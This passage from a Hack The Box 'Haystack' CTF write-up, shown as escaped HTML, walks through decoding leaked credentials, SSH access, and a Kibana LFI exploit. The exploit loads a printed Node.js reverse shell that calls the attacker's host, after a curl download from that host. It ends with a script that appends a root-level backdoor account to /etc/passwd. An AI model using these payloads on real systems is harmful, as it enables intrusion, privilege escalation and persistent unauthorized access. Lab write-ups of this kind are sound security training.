-&lt;p&gt;&lt;br /&gt;Back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;elasticsearch&lt;/code&gt; instance I &lt;a href=&quot;https://www.elastic.co/guide/en/elasticsearch/reference/current/search-search.html&quot;&gt;searched&lt;/a&gt; for the word &lt;code class=&quot;highlighter-rouge&quot;&gt;clave&lt;/code&gt; and got some interesting quotes in Spanish with some base-64 encoded strings:&lt;/p&gt;
-&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;root@kali&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~/Desktop/HTB/boxes/haystack#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;//haystack.htb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9200&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/_search?q=clave&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;took&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;timed_out&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_shards&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;total&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;successful&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;skipped&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;failed&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;total&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;max_score&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;5.9335938&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_index&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;quotes&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;quote&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;45&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_score&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;5.9335938&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_source&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;quote&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}},{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_index&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;quotes&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;quote&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;111&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_score&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;5.3459888&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_source&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;quote&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}]}}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;root@kali&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~/Desktop/HTB/boxes/haystack#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;After translation and decoding:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg =&amp;gt; I have to save the password for the machine: user: security
-
-Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk= =&amp;gt; This key cannot be lost, I keep it here: pass: spanish.is.key
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;We can &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; into the box with these creds &lt;code class=&quot;highlighter-rouge&quot;&gt;security : spanish.is.key&lt;/code&gt;:&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/haystack/2.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;&lt;br /&gt;We owned user.
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;shell-as-kibana&quot;&gt;Shell as kibana&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;After getting &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; access I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;pspy&lt;/code&gt; to monitor the processes, I noticed that &lt;a href=&quot;https://www.elastic.co/products/logstash&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;logstash&lt;/code&gt;&lt;/a&gt; was running as root:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2019/11/01 15:05:08 CMD: UID=0    PID=6387   | /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=tr
-ue -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sni
-ffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_
-prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib
-/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jack
-son-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/ja
-nino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/u
-sr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstas
-h/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expres
-sions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core
-/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/
-share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.ecli
-pse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core
-/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Logstash is an open source, server-side data processing pipeline that ingests data from a multitude of sources simultaneously, transforms it, and then sends it to your favorite “stash.” -&lt;a href=&quot;https://www.elastic.co&quot;&gt;elastic.co&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;br /&gt;But as &lt;code class=&quot;highlighter-rouge&quot;&gt;security&lt;/code&gt; I couldn’t read the configuration files of &lt;code class=&quot;highlighter-rouge&quot;&gt;logstash&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[security@haystack tmp]$ cd /etc/logstash/conf.d/
-[security@haystack conf.d]$ ls -al
-total 12
-drwxrwxr-x. 2 root kibana  62 Jun 24 08:12 .
-drwxr-xr-x. 3 root root   183 Jun 18 22:15 ..
--rw-r-----. 1 root kibana 131 Jun 20 10:59 filter.conf
--rw-r-----. 1 root kibana 186 Jun 24 08:12 input.conf
--rw-r-----. 1 root kibana 109 Jun 24 08:12 output.conf
-[security@haystack conf.d]$ cat input.conf 
-cat: input.conf: Permission denied
-[security@haystack conf.d]$ cat filter.conf 
-cat: filter.conf: Permission denied
-[security@haystack conf.d]$ cat output.conf 
-cat: output.conf: Permission denied
-[security@haystack conf.d]$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;As you can see, the user &lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt; can read them, so we need to be &lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt; and to be the user &lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt; we have to exploit the service itself.
-&lt;br /&gt;By looking at the open ports we can see that port 5601 which is the default port for &lt;a href=&quot;https://www.elastic.co/products/kibana&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt;&lt;/a&gt; is open:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[security@haystack conf.d]$ ss -lnt
-State       Recv-Q Send-Q                                                            Local Address:Port                                                                           Peer Address:Port               
-LISTEN      0      128                                                                           *:80                                                                                        *:*                  
-LISTEN      0      128                                                                           *:9200                                                                                      *:*                  
-LISTEN      0      128                                                                           *:22                                                                                        *:*                  
-LISTEN      0      128                                                                   127.0.0.1:5601                                                                                      *:*                  
-LISTEN      0      128                                                            ::ffff:127.0.0.1:9000                                                                                     :::*                  
-LISTEN      0      128                                                                          :::80                                                                                       :::*                  
-LISTEN      0      128                                                            ::ffff:127.0.0.1:9300                                                                                     :::*                  
-LISTEN      0      128                                                                          :::22                                                                                       :::*                  
-LISTEN      0      50                                                             ::ffff:127.0.0.1:9600                                                                                     :::*                  
-[security@haystack conf.d]$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;Kibana lets you visualize your Elasticsearch data and navigate the Elastic Stack so you can do anything from tracking query load to understanding the way requests flow through your apps. -&lt;a href=&quot;https://www.elastic.co/&quot;&gt;elastic.co&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;br /&gt;I forwarded the port:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/haystack# ssh -L 5601:127.0.0.1:5601 security@haystack.htb
-security@haystack.htb's password: 
-Last login: Fri Nov  1 15:10:02 2019 from 10.10.15.229
-[security@haystack ~]$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/haystack/3.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;&lt;br /&gt;I checked the version and found that it was 6.4.2:&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/haystack/4.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;&lt;br /&gt;After a quick search I found that this version is vulnerable to a &lt;a href=&quot;https://github.com/mpgn/CVE-2018-17246&quot;&gt;local file inclusion vulnerability&lt;/a&gt;.
-&lt;br /&gt;So I uploaded a &lt;code class=&quot;highlighter-rouge&quot;&gt;js&lt;/code&gt; shell to &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/shm&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[security@haystack conf.d]$ cd /dev/shm/
-[security@haystack shm]$ curl http://10.10.xx.xx/shell.js &amp;gt; shell.js
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100   383  100   383    0     0    382      0  0:00:01  0:00:01 --:--:--   383
-[security@haystack shm]$
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;shell.js&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;net&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;net&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;child_process&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;spawn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]);&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;10.10.xx.xx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/a/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Prevents the Node.js application form crashing&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;})();&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;Then I applied the POC and got a reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[security@haystack shm]$ curl 'http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;amp;apis=../../../../../../.../../../../dev/shm/shell.js'
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/haystack# nc -lvnp 1337
-Ncat: Version 7.70 ( https://nmap.org/ncat )
-Ncat: Listening on :::1337
-Ncat: Listening on 0.0.0.0:1337
-Ncat: Connection from 10.10.10.115.
-Ncat: Connection from 10.10.10.115:44210.
-whoami
-kibana
-which python
-/usr/bin/python
-python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
-bash-4.2$ ^Z
-[1]+  Stopped                 nc -lvnp 1337
-root@kali:~/Desktop/HTB/boxes/haystack# stty raw -echo
-root@kali:~/Desktop/HTB/boxes/haystack# nc -lvnp 1337
-
-bash-4.2$
-bash-4.2$ export TERM=screen
-bash-4.2$
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;exploiting-logstash-root-shell&quot;&gt;Exploiting logstash, Root Shell&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;Now we can read the configuration files:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.2$ cd /etc/logstash/conf.d/
-bash-4.2$ cat *
-filter {
-        if [type] == &quot;execute&quot; {
-                grok {
-                        match =&amp;gt; { &quot;message&quot; =&amp;gt; &quot;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&quot; }
-                }
-        }
-}
-input {
-        file {
-                path =&amp;gt; &quot;/opt/kibana/logstash_*&quot;
-                start_position =&amp;gt; &quot;beginning&quot;
-                sincedb_path =&amp;gt; &quot;/dev/null&quot;
-                stat_interval =&amp;gt; &quot;10 second&quot;
-                type =&amp;gt; &quot;execute&quot;
-                mode =&amp;gt; &quot;read&quot;
-        }
-}
-output {
-        if [type] == &quot;execute&quot; {
-                stdout { codec =&amp;gt; json }
-                exec {
-                        command =&amp;gt; &quot;%{comando} &amp;amp;&quot;
-                }
-        }
-}
-bash-4.2$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;By reading the &lt;code class=&quot;highlighter-rouge&quot;&gt;input&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;filter&lt;/code&gt; configuration files and with the help of the &lt;a href=&quot;https://www.elastic.co/guide/en/logstash/current/pipeline.html&quot;&gt;documentation&lt;/a&gt; we will figure out what to do.
-&lt;br /&gt;We need to create an input file of the type &lt;code class=&quot;highlighter-rouge&quot;&gt;execute&lt;/code&gt; and put whatever command we need to execute in it, to create a valid &lt;code class=&quot;highlighter-rouge&quot;&gt;execute&lt;/code&gt; input file it needs to be in &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/kibana/&lt;/code&gt; and named according to the following pattern &lt;code class=&quot;highlighter-rouge&quot;&gt;logstash_[Anything]&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;input {
-        file {
-                path =&amp;gt; &quot;/opt/kibana/logstash_*&quot;
-                ---
-                type =&amp;gt; &quot;execute&quot;
-        }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;It also needs to pass the filter, we need to put &lt;code class=&quot;highlighter-rouge&quot;&gt;Ejecutar comando :&lt;/code&gt; (translates to: &lt;code class=&quot;highlighter-rouge&quot;&gt;Execute command :&lt;/code&gt;) before the command:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;filter {
-        if [type] == &quot;execute&quot; {
-                grok {
-                        match =&amp;gt; { &quot;message&quot; =&amp;gt; &quot;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&quot; }
-                }
-        }
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;I created a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;root.sh&lt;/code&gt; that echoes &lt;code class=&quot;highlighter-rouge&quot;&gt;rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; (This will make us able to &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;rooot : AAAA&lt;/code&gt;. Check &lt;a href=&quot;/hack-the-box/ghoul&quot;&gt;Ghoul&lt;/a&gt;):&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.2$ vi /dev/shm/root.sh
-bash-4.2$ cat /dev/shm/root.sh             
-#!/bin/bash
-echo 'rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash' &amp;gt;&amp;gt; /etc/passwd
-bash-4.2$
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
